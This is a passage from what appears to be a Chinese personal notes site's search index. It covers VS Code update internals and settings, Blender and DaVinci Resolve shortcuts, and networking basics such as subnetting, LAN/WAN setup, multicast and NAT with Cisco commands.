的目录/文件完全删除, 再从 _ 下重命名过去. 貌似还有版本检查的在vscode源码里面, 没细看. 多个进程协作-互斥量 更新补充以下互斥量相关. 更新过程与生命周期有两个互斥量参与: {#AppMutex} {#AppMutex}-ready 其中, 第一个 {#AppMutex} 主要用于生命周期结束时候的释放(就是vscode进程结束时候的释放), 然后提示更新程序可以启动 inno_updater 进行更新. 创建 {#AppMutex} 及释放部分源码: private async installMutex(): Promise<void> { const win32MutexName = this.productService.win32MutexName; if (isWindows && win32MutexName) { try { const WindowsMutex = await import('windows-mutex'); const mutex = new WindowsMutex.Mutex(win32MutexName); once(this.lifecycleMainService.onWillShutdown)(() => mutex.release()); } catch (error) { this.logService.error(error); } } } 创建 {#AppMutex}-ready 源码(这个暂时没看到有释放的操作): procedure CurStepChanged(CurStep: TSetupStep); var UpdateResultCode: Integer; begin if IsBackgroundUpdate() and (CurStep = ssPostInstall) then begin CreateMutex('{#AppMutex}-ready'); while (CheckForMutexes('{#AppMutex}')) do begin Log('Application is still running, waiting'); Sleep(1000); end; Exec(ExpandConstant('{app}\\tools\\inno_updater.exe'), ExpandConstant('\"{app}\\{#ExeBasename}.exe\" ' + BoolToStr(LockFileExists())), '', SW_SHOW, ewWaitUntilTerminated, UpdateResultCode); end; end; CreateMutex('{#AppMutex}-ready') 创建的互斥信号量 用于告知vscode已经临时安装结束 const readyMutexName = `${this.productService.win32MutexName}-ready`; const mutex = await import('windows-mutex'); // poll for mutex-ready pollUntil(() => mutex.isActive(readyMutexName)) .then(() => this.setState(State.Ready(update))); pollUntil(() => mutex.isActive(readyMutexName)) 表示轮询检查 {#AppMutex}-ready 是否已经存在, 存在就表示已经临时安装到 _ 完成. macos无感更新 使用了 electron 下的 autoUpdater 模块. 官网说明: autoUpdater 应用其中部分: autoUpdater 对象具有以下方法 注解 一些当时搜到但是没时间看的文: 研究Electron自动更新 Electron AutoUpdater自动更新问题 linux 不支持, 检查更新后是跳转到浏览器下载的 猜测与想法 后台更新的功能, windows 专门自定义了工具 mac 使用 electron 的自动更新模块 linux 手动下载 至于为什么不全平台支持呢, 猜测可能有以下原因: linux权限控制问题 所以没有像使用压缩包解压复制的方式. 另外使用linux的群体, 大多都是同行吧, 让他/她们自己玩呗 electron 虽然支持了windows与mac, 但是估计有另外的需求, 或者是后面才支持的(不想去看提交历史, 后面有空补充) (electron 的自动更新, 具体怎么实现的我没有去看源码, 不做太多讨论) 是不是可以全平台支持? 使用下载压缩包的形式, 解压的临时目录然后移动. windows已经有exe的支持了, 下载压缩包还需要另外写工具, 得不偿失. 也可能就是不想支持吧 最后, windows就是微软自家产品, 自家产品当然要用自己的","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-vSCode-background-update-inquiry.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-vSCode-background-update-inquiry.html"},{"title":"vscode","text":"常用快捷键: ctrl + p #按文件名搜索 ctrl + shift + f #全局搜索指定文件夹内容 ctrl + f #全局搜索当前打开文件内容 ctrl + shift + p #全局打开文件 关于setting.json: { // Git 可执行文件路径 \"git.path\": \"D:/Program Files/Git/bin/git.exe\" ,\"editor.tabSize\": 4 ,\"editor.insertSpaces\": false ,\"editor.useTabStops\": true // 默认行尾字符。使用 \\n 表示 LF，\\r\\n 表示 CRLF。 ,\"files.eol\": \"\\n\" // 控制编辑器在空白字符上显示特殊符号的方式。可选值为 \"none\"(无)、\"boundary\"(边界) 或 \"all\"(所有)。选择 \"boundary\" 选项，则不会在单词之间的单个空格上显示特殊符号。 ,\"editor.renderWhitespace\": \"all\" // 去除shellcheck local的报错 In POSIX sh, 'local' is undefined // local is supported in many shells, including bash, ksh, dash, and BusyBox ash. However, strictly speaking, it's not POSIX. ,\"shellcheck.exclude\": [\"SC3043\"] } vscode插件离线安装 离线安装 在 vscode插件库 搜索自己需要的插件，点击右侧 Download Extension 然后将下载的文件，复制到vscode安装目录下的bin文件夹中 在bin文件夹下打开cmd，运行如下命令: code --install-extension octref.vuter-0.23.0.vsix #需要安装的插件文件名 注解 vscode中可直接从visx安装插件 原文链接: https://blog.csdn.net/qq_26118603/article/details/115062440","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-vscode.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-vscode.html"},{"title":"vscode-本地历史记录","text":"vscode编辑器内置了本地文件历史记录的支持, 可以通过配置setting.json自定义, 默认的配置如下: // 控制是否启用本地文件历史记录。启用后，所保存编辑器文件内容将存储到备份位置，以便稍后可以还原或查看内容。更改此设置不会影响现有本地文件历史记录条目。 \"workbench.localHistory.enabled\": true, // 配置路径或 [glob 模式](https://aka.ms/vscode-glob-patterns)以排除本地文件历史记录中的文件。glob 模式的计算结果始终是相对于工作区文件夹路径所在的位置，除非它们是绝对路径。更改此设置不会影响现有的本地文件历史记录条目。 \"workbench.localHistory.exclude\": {}, // 控制每个文件的最大本地文件历史记录条目数。当文件的本地文件历史记录条目数超过此数目时，将丢弃最早的条目。 \"workbench.localHistory.maxFileEntries\": 50, // 控制考虑用于本地历史记录的文件最大大小(KB)。较大的文件将不会添加到本地历史记录中。更改此设置不会影响现有本地文件历史记录条目。 \"workbench.localHistory.maxFileSize\": 256, // 配置时间间隔(以秒为单位)，在此间隔期间，本地文件历史记录中的最后一个条目将替换为正在添加的条目。这有助于减少所添加的条目总数，例如启用自动保存时。此设置仅应用于具有相同源的条目。更改此设置不会影响现有本地文件历史记录条目。 \"workbench.localHistory.mergeWindow\": 10, 源码相关 历史文件是全拷贝到一个临时位置, 临时位置跟据用户机器, 一般Windows默认是 $APPDATA/Roaming/Code/User/History 下面的每一个文件夹都是16进制的 源文件全路径的hash值(即每一个文件夹对应一个实际的文件), 下面的每个条目表示每一次的记录全拷贝, 命名为: 四位随机数+后缀 对应关系在条目文件夹的 entries.json 内. 服务源码位置: src/vs/workbench/services/workingCopy/common/workingCopyHistoryService.ts","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-vscode-local-historical-record.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-vscode-vscode-local-historical-record.html"},{"title":"建模-Blender","text":"Blender 是一个开源免费的软件， 支持中文 快捷键-Win 功能 快捷键 场景位移 Shift + 鼠标中键 场景旋转 长按鼠标中键 场景缩放 滚动鼠标中键 物体位移 G (在此基础上点击XYZ，会沿着对应的轴线进行编辑； 或者叫 物体位移) 物体旋转 R (在此基础上点击XYZ，会沿着对应的轴线进行编辑) 物体缩放 S (在此基础上点击XYZ，会沿着对应的轴线进行编辑) 正视图 1 (小键盘数字，可以通过 编辑->偏好设置->输入->模拟数字键盘 开启上方数字键盘的支持， 针对没有小数字键盘的情况) 侧视图 3 (小键盘数字) 透视图 5 (小键盘数字) 顶视图 7 (小键盘数字) 物体最大化 .(小数字键盘， 需先选中物体) 独显 / (即单独显示某一个物体， 需先选中物体) 透显 Alt + Z (主要用于编辑时选择对象整体， 否则只能选择看到的这一面) 添加 Shift + A 模式选择 Ctrl + Tab(需先选中)， 比如编辑模式 倒角 Ctrl + B (为几何图形创建倒角或圆角。 倒角就是用来平滑边线或者拐角的) 循环切割 Ctrl + R 插入 I 挤压 E 封闭 F (一般用于选中边后封边) 沿法向挤出面 Alt + E 对象复制 Shift + G 全部视图同屏显示 Ctrl + Alt + Q (或者直接在左上角拖拽，再或者点击 新建窗口) 关联材质 Ctrl + L 其他说明: 默认模式下， 当开启 对象编辑 时， 1/2/3 的效果就是 点/线/面 的切换 当在编辑模式选择 线 时候， Alt + 单击 可以选择点击面的线条 摄像机视图 摄像机视图显示当前的场景，摄像机视图可以用来拍摄照片，并预览拍摄时场景的样子． 渲染的图像将包含虚线内的所有内容。在这个视图中，您还可以设置呈现渲染区域它定呈的3D视图的部分 Shift + A 新建时候可选择 摄像机 N 可以锁定摄像机(或者在右上角进行属性设置) 放置好摄像机位置后， 可以按小键盘 0 进入摄像机视角 可在右上角设置一些相关属性 着色器 左上角下拉选择 着色器编辑器 渲染引擎 cycles是Blender中著名的渲染引擎，开源免费。 cycles渲染器是基于物理算法的电影级别渲染器，正在被越来越多的好莱坞电影公司以及工作是作为首席渲染器使用 表面细分修改器 表面细分修改器用于将网格的面分割成更小的面, 使其看起来更平滑。它使您能够通过简单建模和低顶点网格创建复杂的光滑表面。 材质预览 右上角球形图标位置","tags":"剪辑","url":"/yq-doc-source-docs-Chaotic-Editing-Modeling-Blener.html","loc":"/yq-doc-source-docs-Chaotic-Editing-Modeling-Blener.html"},{"title":"图片格式转换","text":"方案一: 使用 convert 命令 使用 convert 命令, mac需要安装imagemagick (内置于此包命令): brew install imagemagick 缺点: 质量不高 方案二: sips mac自带, 质量较高 不过不支持转换为 svg ... 参考:: https://blog.csdn.net/qq_41437512/article/details/122619375","tags":"剪辑","url":"/yq-doc-source-docs-Chaotic-Editing-Photo-format-conversion.html","loc":"/yq-doc-source-docs-Chaotic-Editing-Photo-format-conversion.html"},{"title":"基础知识","text":"颜色三要素 色相 饱和度 亮度 素材分类 REC709 常规素材 RAW 原始素材 LOG 灰片素材(log函数转换信息) 设计... A卷文件: 主体素材, 如访谈时的主人公访谈素材 B卷文件: 相关主题素材, 如访谈时主人公相关介绍等","tags":"剪辑","url":"/yq-doc-source-docs-Chaotic-Editing-Some-knowledge.html","loc":"/yq-doc-source-docs-Chaotic-Editing-Some-knowledge.html"},{"title":"达芬奇","text":"系统: MAC 快捷操作 Command + P: 右键视频设置标志帧: 可以理解为设置图片封面 I: 标记入点 O: 标记出点, 跟上一个配合可以截取视频片段 Comand + +: Command加加号, 放大时间线 Comand + -: Command加减号, 缩小时间线, 与上一个可见于 时间线缩放 Shift + Z: 对当前时间线进行适配操作(尽量能看到更多时间线) F9: 插入视频片段 F10: 覆盖视频片段 F11: 替换视频片段, 与上两个注意 插入/覆盖/替换操作时注意 A: 选择模式, 可以拖动时间线的视频, 进行裁剪, 会替换裁减的视频帧为空白, 需手动删除此部分空白 T: 修剪编辑模式, 上一个的改进, 自动删除被裁减的视频帧(波纹修剪) ps: 从素材截取好片段后可以直接拖入时间线 播放快捷键(J, K, L): J: 倒放, 再按一次加速(可多次加速) K: 暂停播放 L: 快速播放, 再按一次加速(可多次加速) K + J: 逐帧向后播放 K + J(长按): 向后0.5倍速播放 K + L: 逐帧向前播放 K + L(长按): 向前0.5倍速播放 空格: 暂停/播放 +: 加号, 向前跳转指定时间(帧) -: 减号, 向后跳转指定时间(帧), 与上一个可见 跳转指定时间(帧) 软件相关概念 Master工作区 主工作区 达芬奇默认维护的一个工作区, 用来管理素材分类, 开在此部分下新建文件夹 Master工作区 时间线缩放 可以将正在操作的时间线放大缩小, 其实就是视频帧的更详细/更精简 时间线缩放 向前/后跳转指定时间(帧) 剪辑时候可以在选定的媒体库指定向前/后跳转指定时间(帧), 快捷键为在媒体时, 单击 +/- (单击加号或者减号), 加号向前, 减号向后 出现的框中输入格式:: 时:分:秒:帧 向前/后跳转指定时间(帧) J-Cat 有些视频, 先听到人物说话的声音, 再看到人. 实际应用相当于为一个场景配音. 插入/覆盖/替换操作时注意 当插入/覆盖/替换操作(F9/F10/F11)时, 注意音频是否需要覆盖 此处是否选中决定是否对音频进行操作","tags":"剪辑","url":"/yq-doc-source-docs-Chaotic-Editing-da-Vinci.html","loc":"/yq-doc-source-docs-Chaotic-Editing-da-Vinci.html"},{"title":"剪辑","text":"","tags":"剪辑","url":"/yq-doc-source-docs-Chaotic-Editing-index.html","loc":"/yq-doc-source-docs-Chaotic-Editing-index.html"},{"title":"HTTP认识","text":"HTTP是一种协议, 超文本传输协议, 不提供数据包的传输功能. 本质为: 客户端和服务端约定好的一种通信格式 (就像秦始皇的车同轨书同文). 与RPC区别 属于两个维度, HTTP是通信协议, RPC是远程过程调用(调用远程服务器的本地方法, 相反的是自己调用自己本地方法). RPC可以基于HTTP使用, 也可以基于其他协议(如TCP)使用, 一般都是基于TCP, 因为TCP协议在传输层, 比HTTP的应用层更底层, 传输更快. RPC是面向过程的，最终的目的就是为了传输对象，所以只需要网络通信+对象的序列化和反序列化就行了 (rpc关注的应该是传输协议和序列化协议) HTTP冗余度，复杂性，性能都不太行，而且还要指定ip端口，请求资源路径等等 至于为什么使用封装好的RPC, 一是因为RPC不局限于使用HTTP协议(HTTP协议较冗余) 二是都是内部使用(很少有给外部提供直接调用方法的), 不用考虑通用性(HTTP通用性较好) 技巧 一般RPC都是对内, HTTP对外使用","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-Http-know.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-Http-know.html"},{"title":"IP地址与子网划分","text":"IP地址是一个 32位的二进制 地址，被分为4个8位段（八位组）。 人们不习惯使用32的二进制地址或8位的二进制八位组， 所以IP地址最常用的表达形式是 点分十进制 形式。 IP地址分类 IP地址中一部分是 网络ID ，另一部分是 主机ID ， 地址分类系统把IP地址划分为不同的地址类： A类地址 ：IP地址的前 8 位表示网络ID，后24位表示主机ID B类地址 ：IP地址的前 16 位表示网络ID，后16位表示主机ID C类地址 ：IP地址的前 24 位表示网络ID，后8位表示主机ID 使用的位数越多，包含的组合就越多，可知A类地址较少的网络ID， 但每个网络都具有大量的可用主机ID。 那计算机或路由器是如何将一个IP地址解释为A类、B类还是C类呢？ 其实二进制的前几位就是用来地址分类. 注解 D类地址，前4位为1110，用于多播（组播） E类地址，前5位为11110，实验性质的，不用于生产环境 排除地址 指的是 私有IP地址 ，用于本地局域网的IP地址分配 特殊的IP地址 全0 主机ID：表示 网络本身 ，如IP地址129.152.0.0是指网络ID为129.152的B类网络 全1 主机ID：表示 广播地址 ，如IP地址129.152.255.255是指网络ID为129.152的B类网络的广播地址 十进制 127开头 的地址： 环回地址 ，用于测试自身TCP/IP软件是否正常，如ping自己127.0.0.1 子网掩码 子网掩码是需要配合IP地址一起使用的，用于指示IP地址的前多少比特是网络ID，后多少比特是主机ID。 A、B、C类地址均有默认的掩码，也称固定掩码： 子网划分 子网划分是 从主机号字段借用若干位比特 ， 把物理网络分解为更小的逻辑实体（称为子网）的一种手段，从而可以更加充分的利用有限的IP地址资源。 将初始网络分段，必须设计一种编址方案， 能够识别出大型网络中的每个子网。一台特定主机可以通过以下三项被唯一识别： 网络号 唯一地指定主机所在网路（如果网络是公共互联网，网络号就是表示网络的地址，包括了其所有的子网） 子网号 唯一的指定了一个子网（初始网络内部的子网），一个子网内部包含若干主机 主机号 唯一地指定了子网内的某台主机 子网划分的几个步骤 确定需要的 子网个数 确定一个 子网内可能的最多主机数量 确定从主机号字段 借用的比特数 ，用于创建子网号字段 确定主机号字段需要 保留的比特数 （不能被子网字段借用的比特数） 确定 原始 网络号字段和主机号字段的比特数 检查以确保被借用的比特数 没有超过 被保留的比特数（即检查子网划分问题是可解的） 设置 子网号字段的最佳长度 ，包括为未来增长预留空间 创建一个修改（自定义）的 子网掩码 确定 有效的子网号 确定每个子网的 IP地址有效范围 子网划分举例 问题：有一个C类地址193.200.35.0，分配给某个组织， 该组织需要两个子网，每个子网的主机数不会超过30台。 分析：子网数S=2，每个子网内最多的主机数H=30，C类地址的主机位比特T=8 确定 子网个数 ，S=2 确定一个 子网内可能的最多主机数量 ，H=30 求解2&#94;s - 2 >= S的最小整数s，解得s=2，即从主机号字段 借用的比特数 ，用于创建子网号字段 求解2&#94;h - 2 >= H的最小整数h，解得h=5，即主机号字段需要 保留的比特数 确定 原始 网络号字段和主机号字段的比特数，网络号字段为24，主机号字段T=8 因为s + h = 2 +5 =7 < 8，即借用的比特数 没有超过 被保留的比特数，问题可解 由于7 < 8，并且r = T - s - h = 1，因而可将 r分配给s或h，通常情况下子网的数量相比子网内主机的数量更容易耗尽， 因而将r分配给s，即s = s + r = 2 + 1 =3，此时s + h = 3 + = 8 = T 创建一个自定义的 子网掩码 ，默认C类地址的子网掩码为255.255.255. 0 ， 需要计算一个新值代替其0字节，计算256 - 2 &#94; (8 - s) = 256 - 2 &#94; 5 = 256 - 32 = 224（ 前s位全置为1，也就是前三位全置为1 ）， 所以自定义子网掩码为 255.255.255.224 确定 有效的子网号 ，运势网络地址为193.200.35. 0 ，将2 &#94; (8 - s)= 2 &#94; 5 = 32加到其0字节上， 得到第一个子网的网络地址为193.200.35. 32 。继续在此字节上加上2 &#94; (8 - s)， 直至其等于自定义的子网掩码，具体如下： 确定每个子网的 IP地址有效范围 ，先计算第一个子网， 其地址为193.200.35. 33 ， 所以其有效起始地址为193.200.35. 33 ， 子网内可以有 2&#94;h - 2 = 2&#94;5 - 2 = 30个IP地址，所以结束地址为193.200.35. 62 注解 每个子网的有效 起始 IP为 子网地址+1 ， 每个子网的有效 结束 IP为 子网地址+子网内IP总数 ， 也为 下一个子网地址-2 ，中间跳过的一个IP地址为子网的 广播地址 一些题目 给定IP地址`167.77.88.99`和掩码`255.255.255.192`，求子网号、广播地址、有效IP地址。 分析： IP地址---->167.77.88.99--> 10100111.01001101.01011000.01100011 掩码-->255.255.255.192-->11111111.11111111.11111111.11000000 对应位求积--------------------> 10100111.01001101.01011000.01000000--> 167.77.88.64 （ 子网号 ）（就是and） 广播地址**(子网主机全1)---> 10100111.01001101.01011000.01111111-->**167.77.88.127 有效IP**(除去子网本身和广播地址):**167.77.88.65~167.77.88.126 一个子网网段地址为5.32.0.0，掩码为255.224.0.0网络，求它允许的最大主机地址。 分析： 网段------->5.32.0.0-->00000101.00100000.00000000.00000000 掩码-->255.254.0.0-->11111111.11100000.00000000.00000000-->主机位为21位（0位） 最大主机地址 ---------->00000101.00111111.11111111.11111110-->5.63.255.254 （广播地址减一，也就是子网主机全1减一） 188.188.0.111，188.188.5.222，子网掩码都设为255.255.254.0，在同一网段吗？ 分析： IP1---->188.188.0.111-->10111100.10111100.00000000.01101111 IP2---->188.188.5.222-->10111100.10111100.00000101.11011010 掩码-->255.255.254.0-->11111111.11111111.11111110.00000000 IP分别与掩码作求积运算： 10111100.10111100.00000000.00000000 10111100.10111100.00000100.00000000 网络标识不一样，即不在同一网段 参考:: 《TCP/IP入门经典 第6版》/ 乔·卡萨德（Joe Casad） 《计算机网络基础教程：基本概念及经典问题解析》/ 纳拉辛哈·卡鲁曼希 等 https://blog.csdn.net/hawht/art","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-IP-address-and-subnet-division.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-IP-address-and-subnet-division.html"},{"title":"LAN与WAN","text":"WAN端口用于连接至Internet LAN端口用于连接至局域网设备 LAN端口连接你自己的设备，笔记本/台式机/打印机等； 无线路由器配置的wifi则相当于LAN端口，连接自己的无线设备，手机/ipad/笔记本等； 当WAN端口连上外网，LAN端口上的各个设备和路由器一起组成了一个小型局域网，这个局域网内的设备可以互相发现，访问。 普通路由器的LAN端口只有4个，当不够用的时候怎么办呢？变相扩充LAN端口的办法： 交换机，连LAN口，交换机的作用可以简单理解为帮你把4个LAN端口扩展到N个； 路由器，连LAN口，第二个路由器就是当前局域网的子局域网； 就跟家里的局域网一样，电脑不是直接连上英特网，而是作为子网连上去的，这样多个设备可以共用一个公网IP。 路由器还可以当交换机用 当不使用路由器的WAN端口，只使用LAN端口时，就可以看成是个交换机了， 当然此时LAN端口IP要设置成局域网段内的IP，并且最好配置关闭DHCP； 假设 原路由器IP为192.168.1.1 掩码为255.255.255.0 可用网段为192.168.1.2~192.168.1.254， 那么你作交换机用途的路由器 LAN端口IP 应设置为 192.168.1.2~192.168.1.254 范围内的IP； 如果你想要局域网中再接入局域网，则应设置WAN端口IP自动获取， LAN端口IP应与原路由器的IP在不同网段，如192.168.2.1） 问题-同局域网的两个路由器下的电脑想要ping通 注解 路由器的网段不能相同 方法1: b路由器 的lan口 连 a路由器的lan口（记得关闭一个路由的dhcp服务） 方法2: a路由器配置路由规则，使b网段的机器都走b路由（需要a路由有这个功能） 其他: 参考: https://www.zhihu.com/question/20738115","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-LAN-and-Wan.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-LAN-and-Wan.html"},{"title":"多播地址","text":"多播地址(Multicast Address)是一种特殊的 IP 地址,用于同时向多台主机发送 UDP 数据包。 多播地址有以下特征: 以 224.0.0.0 到 239.255.255.255 之间的 IP 地址为多播地址范围。 多播地址不对应具体的网络接口或主机,它代表一组目标接收者。 发送到多播地址的数据包会被路由器和交换机自动复制并推送到子网内的所有计算机。 每台主机都运行一个多播成员处理进程,该进程处理发送到多播地址的数据包。 想接收多播地址的数据,主机需要加入到这个多播组。未加入的主机不会接收这些数据包。 所以,多播地址允许一台主机向多台主机同时发送数据包,接收数据的主机可以自动加入和离开多播组。 使用多播地址的典型应用有: 视频会议和流媒体:将视频流发送到多播地址,多个客户端同时收看。 网络游戏:将游戏数据包发送到多播地址,多个游戏客户端同时接收和响应。 UPnP:UPnP 设备使用多播地址 239.255.255.250 发送服务通告,被控制点同时接收。 路由器网络配置:有些路由器使用多播地址传送配置数据,多个路由器可以同时接收。 等等。","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-Multi--broadcast-address.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-Multi--broadcast-address.html"},{"title":"网络中的NAT模式","text":"参考: https://www.cnblogs.com/linhaostudy/p/10355614.html 阅读目录 概述 分类 NAT的三个方向： NAT的应用分类： 工作原理 NAT-原理 NAT-基本地址转换原理 NAT中的转换方式: NAT-基本IP地址转换原理 内部地址NAT-转换原理 一个简单的NAT-转换示例 外部地址NAT-转换原理 概述 NAT英文全称是\"Network Address Translation\"，中文意思是\"网络地址转换\"， 它是一个IETF(Internet Engineering Task Force, Internet工程任务组)标准， 允许一个整体机构以一个公用IP（Internet Protocol）地址出现在Internet上。 顾名思义，它是一种把内部私有网络地址（IP地址）翻译成合法网络IP地址的技术。 NAT 可以让那些使用私有地址的内部网络连接到Internet或其它IP网络上。 NAT路由器在将内部网络的数据包发送到公用网络时，在IP包的报头把私有地址转换成合法的IP地址。 RFC1918规定了三块专有的地址，作为私有的内部组网使用: A类：10.0.0.0—10.255.255.255 10.0.0.0/8 B类：172.16.0.0—172.31.255.255 172.16.0.0/12 C类：192.168.0.0—192.168.255.255 192.168.0.0/16 这三块私有地址本身是可路由的，只是公网上的路由器不会转发这三块私有地址的流量； 当一个公司内部配置了这些私有地址后，内部的计算机在和外网通信时， 公司的边界路由会通过NAT或者PAT技术，将内部的私有地址转换成外网IP， 外部看到的源地址是公司边界路由转换过的公网IP地址，这在某种意义上也增加了内部网络的安全性。 Basic NAT 是一种把一组IP地址映射成另一组IP地址的方法，映射的过程在IP中继设备上完成，对用户完全透明。 NAPT 要复杂一些，它把许多（不能太多）IP地址连同TCP/UDP端口号映射到单独一个IP地址和端口号上。 无论是Basic NAT还是NAPT都提供一种把内部的私有地址转换成在公网上可用的全球唯一IP地址的方法。 NAT分类 NAT有三种类型： 静态NAT(Static NAT)（一对一）。 将内部网络的私有IP地址转换为公有IP地址，IP地址对是一对一的，是一直不变的； 动态地址NAT(Pooled NAT)（多对多）。 将内部网络的私有IP地址转换为公用IP地址时，IP地址是不确定，随机的。 所有被授权访问Internet的私有IP地址可随机转换为任何指定合法的IP地址。 也就是说，只要指定哪些内部地址可以进行转换，以及用哪些合法地址作为外部地址时，就可以进行动态NAT转换。 动态NAT是在路由器上配置一个外网IP地址池，当内部有计算机需要和外部通信时， 就从地址池里动态的取出一个外网IP，并将他们的对应关系绑定到NAT表中， 通信结束后，这个外网IP才被释放，可供其他内部IP地址转换使用，这个DHCP租约IP有相似之处。 当ISP提供的合法IP地址略少于网络内部的计算机数量时。可以采用动态转换的方式。 网络地址端口转换NAPT（Network Address Port Translation）（Port-Level NAT）（多对一）。 改变外出数据包的源端口并进行端口转换，采用端口多路复用方式。 内部网络的所有主机均可共享一个合法外部IP地址实现对Internet的访问，可以最大限度地节约IP地址资源。 同时，也可以隐藏网络内部的所有主机，有效避免来自Internet的攻击。 因此，目前网络中应用最多的就是PAT规则。这是最常用的NAT技术，也是IPv4能够维持到今天的最重要的原因之一， 它提供了一种多对一的方式，对多个内网IP地址，边界路由可以给他们分配一个外网IP， 利用这个外网IP的不同端口和外部进行通信。 NAPT 与 动态NAT 不同，它将内部连接映射到外部网络中的一个单独的IP地址上，同时在该地址上加上一个由NAT设备选定的端口号。 NAPT是使用最普遍的一种转换方式，在HomeGW中也主要使用该方式。 它又包含两种转换方式：SNAT和DNAT。 源NAT（Source NAT，SNAT）：修改数据包的源地址。 源NAT改变第一个数据包的来源地址，它永远会在数据包发送到网络之前完成，数据包伪装就是一具SNAT的例子。 目的NAT（Destination NAT，DNAT）：修改数据包的目的地址。 Destination NAT刚好与SNAT相反，它是改变第一个数据懈的目的地地址，如平衡负载、端口转发和透明代理就是属于DNAT。 对于网络地址转换技术来讲，最重要的一点是，在配置 NAT 的路由器上形成了 NAT 转换表，这个转换表的形成是非常关键的。 配置 NAT 后，能形成正确的转换表，那么我们的工作就算成功了。 NAT的三个方向 NAT 在outside口生效，所有在inside口需要先路由,在outside口先nat。 ip nat inside source: 将内部局部地址转换为内部全局地址;数据方向inside->outside,在outside上执行转换; ip nat inside destination: 将内部全局地址转换为内部局部地址;数据方向outside->inside,在outside上执行转换 ip nat outside source: 将外部全局地址转换为外部局部地址;数据方向outside->inside,在outside上执行转换; NAT的应用分类 ip nat source 静态 nat的映射：永远一个ip对应另外一个ip。 ip nat inside source static A.B.C.D A.B.C.D 动态 nat的映射：每次一个IP会对应另外一个公网的IP； ip nat inside source list 2 pool qing 动态PAT映射：pool里面只有一个IP。 ip nat inside source list 2 pool qing overload 静态PAT映射： ip nat inside source list 3 interface fastEthernet 0/0 overload ip nat inside destination tcp负载均衡，外网主动发起流量访问内网服务器。只用动态，没有静态。 ip nat inside destination list 10 pool feng ip nat outside source: 当两端同时做nat既inside和outside需要同时翻译并出现地址冲突的时候需要用outside source和其他同时命令同时实现。 Cisco路由器配置3中NAT的主要命令 静态NAT 指定NAT内部接口, 在内网相应接口的接口配置模式下执行: ip nat inside 指定NAT外部接口, 在外网相应接口的接口配置模式下执行: ip nat outside 在内部本地地址与内部全局地址之间建立静态地址转换关系: ip nat insde source static 内部本地地址 内部全局地址 动态地址NAT 指定NAT内部接口, 在内网相应接口的接口配置模式下执行: ip nat inside 指定NAT外部接口, 在外网相应接口的接口配置模式下执行: ip nat outside 在全局配置模式下，定义一个标准的access-list规则， 声明允许哪些内部本地地址可以进行动态地址转换: access-list list-number permit 源地址 通配符 其中，list-number为1－99之间的一个任意整数。 在全局配置模式下，定义内部全局地址池: ip nat pool 地址池名 起始IP地址 终止IP地址 netmask 子网掩码 其中，地址池名可以任意设定，但最好有一定的说明意义。 在全局配置模式下， 定义符合先前定义的access-list规则的IP数据包与先前定义的地址池中的IP地址进行转换: ip nat inside source list list-number pool 内部全局地址池名 网络地址端口转换NAPT 指定NAT内部接口, 在内网相应接口的接口配置模式下执行: ip nat inside 指定NAT外部接口, 在外网相应接口的接口配置模式下执行: ip nat outside 在全局配置模式下，定义内部全局地址池: ip nat pool 地址池名 起始IP地址 终止IP地址 netmask 子网掩码 其中，地址池名可以任意设定，但最好有一定的说明意义。 在全局配置模式下，定义一个标准的access-list规则，声明允许哪些内部本地地址可以进行复用地址转换: access-list list-number permit 源地址 通配符 其中，list-number为1－99之间的一个任意整数。 在全局配置模式下，定义符合先前定义的access-list规则的IP数据包与先前定义的地址池中的IP地址进行复用地址转换: ip nat inside source list list-number pool 内部全局地址池名 overload 工作原理 了解原理之前先了解下NAT 术语。 在配置了 NAT 的路由器上，可以把整个网络分成两部分：内部网络 和 外部网络。 NAT 技术中有四个术语： 内部本地地址（Inside Local）：内网中设备所使用的IP地址 内部全局地址（Inside Global）：对于外部网络来说，局域网内部主机所表现的 IP 地址。 外部本地地址（Outside Local）：外部网络主机的真实地址。 外部全局地址（Outside Global）：对于内部网络来说，外部网络主机所表现的 IP 地址。外网设备所使用的真正的地址。 local 、global 是相对于端口状态说的，local是inside部分可以被路由的，global是outside部分可以被路由的。 网络地址转换常常和代理服务搞混，但是它们之间有明确的不同。NAT 对源和目的计算机都是透明的。 没有任何一方会意识到它正在和第三方设备打交道。但是代理服务却不是透明的。 源计算机知道它正向代理服务器发起一个请求，而且你还必须进行配置才能这样做。 目的计算机会认为代理服务器就是与它直接通信的源计算机。 还有，代理服务通常工作在 OSI 参考模型的第 4 层 (传输层) 或更高，而 NAT 工作在第 3 层 (网络层)。 由于代理服务工作在更高层，所以通常它将比 NAT 要慢。 NAT 工作在 OSI 参考模型的网络层 (第3层) 是有道理的，因为路由器就工作在这一层： NAT 原理 NAT设备维护一个状态表，用来把非法的IP地址映射到合法的IP地址上去。 每个包在NAT设备中都被翻译成正确的IP地址，发往下一级，这意味着给处理器带来了一定的负担。 但对于一般的网络来说，这种负担是微不足道的。 在运行NAT的路由器中，当数据包被传送时，NAT可以转换数据包的IP地址和TCP/UDP数据包的端口号。 设置NAT功能的路由器至少要有一个Inside（内部）端口和一个Outside（外部）端口。 内部端口连接内网的用户，外部端口一般连接到Internet。 当IP数据包离开内部网络时，NAT负责将内网IP源地址（通常是专用地址）转换为合法的公共IP地址。 当IP数据包进入内网时，NAT将合法的公共IP目的地址转换为内网的IP源地址。 NAT的基本工作原理是：当私有网主机和公共网主机通信的IP包经过NAT网关时，将IP包中的源IP或目的IP在私有IP和NAT的公共IP之间进行转换。 当内部网络中的一台主机想传输数据到外部网络时，它先将数据包传输到NAT路由器上，路由器检查数据包的报头， 获取该数据包的源IP信息，并从它的NAT映射表中找出与该IP匹配的转换条目， 用所选用的内部全局地址（全球唯一的IP地址）来替换内部局部地址，并转发数据包。 